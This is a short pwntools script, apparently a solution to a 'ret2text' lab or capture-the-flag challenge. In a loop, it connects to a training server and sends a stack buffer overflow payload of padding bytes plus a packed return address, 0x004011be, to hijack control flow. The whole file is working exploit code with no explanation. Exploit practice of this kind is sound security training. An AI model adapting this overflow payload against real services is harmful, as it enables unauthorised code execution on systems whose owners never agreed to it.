from pwn import *

# r = process('/media/sf_D_DRIVE/ret2text')
while(True):
    r = remote('lab.scist.org', 33302)

    for _ in range(4):
        print(r.recvline().decode())
    # r.sendline((b'A') * 0x100 + (b'A') * 8 + p64(0x004011be))
    try:
        r.sendline((b'A') * 0x100 + (b'A') * 8 + p64(0x004011be))
    except:
        pass
